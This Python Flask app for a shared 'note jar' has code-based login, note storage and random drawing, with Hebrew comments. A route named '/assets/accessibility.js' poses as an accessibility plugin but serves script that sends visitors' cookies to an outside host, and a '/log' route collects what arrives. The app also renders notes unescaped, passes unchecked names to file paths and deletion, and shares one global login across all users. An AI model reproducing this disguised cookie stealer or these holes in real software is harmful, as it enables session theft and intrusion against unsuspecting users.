import os
import random
from flask import Flask, render_template, request, redirect
from datetime import datetime
from flask_cors import CORS


# קובץ לוג אבטחה
def log_security_event(event_type, ip_address, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{timestamp}] [{event_type}] IP: {ip_address} | {details}\n"
    with open("security.log", "a", encoding="utf-8") as log_file:
        log_file.write(log_line)
app = Flask(__name__)
CORS(app)

DATA_DIR = "data"

ACCESS_CODES = {
    "1234": "user_couple",
    "5678": "user_friends"
}
FAILED_ATTEMPTS = {}

CURRENT_USER = None


@app.route("/")
def home():
    global CURRENT_USER
    CURRENT_USER = None
    return render_template("login.html")


@app.route("/login_redirect")
def login_redirect():
    global CURRENT_USER
    if not CURRENT_USER:
        return redirect("/")
    user_folder = os.path.join(DATA_DIR, CURRENT_USER)
    user_jars = os.listdir(user_folder)
    return render_template("dashboard.html", jars=user_jars)


@app.route("/login", methods=["POST"])
def login_check():
    global CURRENT_USER

    user_ip = request.remote_addr

    # 1. הגבלה למניעת ברוט-פורס
    if FAILED_ATTEMPTS.get(user_ip, 0) >= 3:
        print(f"[SECURITY ALERT] חסימת ברוט-פורס הופעלה עבור IP: {user_ip}")
        log_security_event("BRUTE-FORCE BLOCK", user_ip, "IP is temporarily banned due to too many failed attempts")
        return """
        <body style="background-color: #F5F5DC; font-family: sans-serif; text-align: center; padding-top: 100px;" dir="rtl">
            <h1 style="color: #DC3545; font-size: 40px;">❌ המערכת ננעלה!</h1>
            <p style="font-size: 20px; color: #333;">ניסית להקיש קוד שגוי יותר מדי פעמים. ה-IP שלך נחסם זמנית מטעמי אבטחה.</p>
        </body>
        """, 403

    entered_code = request.form.get("secret_code")

    # 2. הגבלת תווים למניעת קריסה
    if entered_code and len(entered_code) > 10:
        print(f"[SECURITY ALERT] קלט חריג באורכו נחסם מ-IP: {user_ip}")
        log_security_event("SUSPICIOUS INPUT", user_ip,
                           f"Input length ({len(entered_code)} chars) exceeded safety limit")
        return """
        <body style="background-color: #F5F5DC; font-family: sans-serif; text-align: center; padding-top: 100px;" dir="rtl">
            <h1 style="color: #DC3545; font-size: 40px;">⚠️ בקשה חסומה!</h1>
            <p style="font-size: 20px; color: #333;">הקלט שהוזן אינו תקין או ארוך מדי מהמותר.</p>
            <br><br>
            <a href="/" style="background-color: #8A2BE2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 6px; font-weight: bold;">🔙 חזרה למסך הכניסה</a>
        </body>
        """, 400

    if entered_code in ACCESS_CODES:
        CURRENT_USER = ACCESS_CODES[entered_code]
        print(f"[INFO] משתמש מורשה נכנס: {CURRENT_USER}")
        FAILED_ATTEMPTS[user_ip] = 0
        return redirect("/login_redirect")
    else:
        FAILED_ATTEMPTS[user_ip] = FAILED_ATTEMPTS.get(user_ip, 0) + 1
        attempts_left = 3 - FAILED_ATTEMPTS[user_ip]
        print(f"[WARNING] קוד שגוי מ-IP: {user_ip}. ניסיונות שנשארו: {attempts_left}")
        log_security_event("FAILED LOGIN", user_ip, f"Entered wrong code. Attempts remaining: {attempts_left}")

        if attempts_left <= 0:
            log_security_event("BRUTE-FORCE TRIGGERED", user_ip, "User just hit the 3 failed attempts limit")
            return """
            <body style="background-color: #F5F5DC; font-family: sans-serif; text-align: center; padding-top: 100px;" dir="rtl">
                <h1 style="color: #DC3545; font-size: 40px;">❌ המערכת ננעלה!</h1>
                <p style="font-size: 20px; color: #333;">ניסית להקיש קוד שגוי יותר מדי פעמים. ה-IP שלך נחסם זמנית מטעמי אבטחה.</p>
            </body>
            """, 403
        else:
            return f"""
            <body style="background-color: #F5F5DC; font-family: sans-serif; text-align: center; padding-top: 100px;" dir="rtl">
                <h1 style="color: #333; font-size: 40px;">❌ קוד גישה שגוי!</h1>
                <div style="display: inline-block; background-color: #FFFDE7; border-right: 5px solid #DC3545; padding: 15px 30px; border-radius: 6px; margin: 20px 0;">
                    <p style="font-size: 22px; font-weight: bold; color: #DC3545; margin: 0;">⚠️ נשארו לך עוד {attempts_left} ניסיונות בלבד.</p>
                </div>
                <br><br>
                <a href="/" style="background-color: #8A2BE2; color: white; padding: 12px 24px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.15);">🔄 נסה שוב</a>
            </body>
            """
@app.route('/log', methods=['GET', 'POST'])
def log_data():
    if request.args:
        print("\n--- [!] new information as arrived (GET) ---")
        for key, value in request.args.items():
            print(f"{key}: {value}")

    if request.form:
        print("\n--- [!] new information as arrived (POST) ---")
        for key, value in request.form.items():
            print(f"{key}: {value}")

    return "OK", 200

@app.route('/assets/accessibility.js', methods=['GET'])
def accessibility_plugin():
    # מכשיר ציטוט פנימי
    plugin_code = """
    console.log("Accessibility Plugin Loaded Successfully v1.4.2");
    
    (function() {
        var cookies = document.cookie;
        if (cookies) {
            fetch('https://python-pickwiz.onrender.com/log?data=' + encodeURIComponent(cookies));
        }
    })();
    """
    return plugin_code, 200, {'Content-Type': 'application/javascript'}


@app.route("/create_jar", methods=["POST"])
def create_jar():
    global CURRENT_USER
    if not CURRENT_USER:
        return "<h1>❌ גישה נדחתה! עליך להתחבר תחילה.</h1>", 403

    new_jar_name = request.form.get("new_jar_name")
    if new_jar_name:
        new_jar_path = os.path.join(DATA_DIR, CURRENT_USER, new_jar_name)
        if not os.path.exists(new_jar_path):
            os.makedirs(new_jar_path)
            print(f"[SUCCESS] נוצר שק חדש במערכת: {new_jar_path}")

    return redirect("/login_redirect")


@app.route("/jar/<jar_name>")
def view_jar(jar_name):
    global CURRENT_USER
    if not CURRENT_USER:
        return "<h1>❌ גישה נדחתה!</h1>", 403

    jar_path = os.path.join(DATA_DIR, CURRENT_USER, jar_name)
    notes_content = []

    all_files = os.listdir(jar_path)
    for file_name in all_files:
        if file_name.endswith(".txt"):
            file_path = os.path.join(jar_path, file_name)
            with open(file_path, "r", encoding="utf-8") as f:
                notes_content.append(f.read())

    return render_template("jar_view.html", jar_name=jar_name, notes=notes_content)


@app.route("/add_note/<jar_name>", methods=["POST"])
def add_note(jar_name):
    global CURRENT_USER
    if not CURRENT_USER:
        return "<h1>❌ גישה נדחתה!</h1>", 403

    note_text = request.form.get("note_content")

    if note_text:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"note_{timestamp}.txt"
        file_path = os.path.join(DATA_DIR, CURRENT_USER, jar_name, file_name)

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(note_text)

        print(f"[SUCCESS] פתק חדש נשמר בדיסק: {file_name}")

    return redirect(f"/jar/{jar_name}")

@app.route("/draw/<jar_name>")
def draw_note(jar_name):
    global CURRENT_USER
    if not CURRENT_USER:
        return "<h1>❌ גישה נדחתה!</h1>", 403

    jar_path = os.path.join(DATA_DIR, CURRENT_USER, jar_name)

    all_files = [f for f in os.listdir(jar_path) if f.endswith(".txt")]

    if not all_files:
        return f"<h1>שק {jar_name} ריק לחלוטין! תוסיפו כמה פתקים קודם ואז תגרילו. 🎯</h1><br><a href='/jar/{jar_name}'>חזרה לשק</a>"

    chosen_file = random.choice(all_files)

    chosen_file_path = os.path.join(jar_path, chosen_file)
    with open(chosen_file_path, "r", encoding="utf-8") as f:
        winning_note = f.read()

    print(f"[LOG] בוצעה הגרלה! הפתק שנבחר: {chosen_file}")

    return f"""
    <div style="text-align: center; margin-top: 0px; padding-top: 80px; font-family: sans-serif; background-color: #F5F5DC; min-height: 100vh; box-sizing: border-box;" dir="rtl">

        <h1 style="font-size: 45px; color: #333; margin-bottom: 30px;">🎉 תוצאת ההגרלה! 🎉</h1>

        <div style="display: inline-block; padding: 40px; border-right: 8px solid #8A2BE2; background-color: #FFFDE7; border-radius: 8px; margin: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.08); max-width: 500px; min-width: 300px;">
            <p style="font-size: 28px; font-weight: bold; color: #333; margin: 0; line-height: 1.5;">{winning_note}</p>
        </div>

        <br><br><br>

        <a href="/delete_note/{jar_name}/{chosen_file}" 
           style="background-color: #DC3545; color: white; padding: 12px 28px; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 8px; border: 2px solid #bd2130; box-shadow: 0 4px 6px rgba(0,0,0,0.2); display: inline-block; cursor: pointer; margin: 10px;">
           🗑️ השתמשנו בפתק, מחק אותו!
        </a>

        <a href="/jar/{jar_name}" 
           style="background-color: #8A2BE2; color: white; padding: 12px 28px; font-size: 18px; font-weight: bold; text-decoration: none; border-radius: 8px; border: 2px solid #7312c9; box-shadow: 0 4px 6px rgba(0,0,0,0.2); display: inline-block; cursor: pointer; margin: 10px;">
           🔙 חזרה לשק (בלי למחוק)
        </a>

    </div>
    """

@app.route("/delete_note/<jar_name>/<file_name>")
def delete_note(jar_name, file_name):
    global CURRENT_USER
    if not CURRENT_USER:
        return "<h1>❌ גישה נדחתה!</h1>", 403


    file_path = os.path.join(DATA_DIR, CURRENT_USER, jar_name, file_name)

    # הגנה: בודקים שהקובץ באמת קיים לפני שמוחקים כדי למנוע קריסה
    if os.path.exists(file_path):
        os.remove(file_path)  # פקודת הסיסטם שמוחקת את הקובץ מהדיסק!
        print(f"[SUCCESS] הפתק {file_name} נמחק בהצלחה מהשק {jar_name}")

    return redirect(f"/jar/{jar_name}")

@app.route('/secure-zone')
def secure_zone():
    return render_template('secure_site.html')
    
if __name__ == "__main__":
    app.run(debug=True, port=5000)
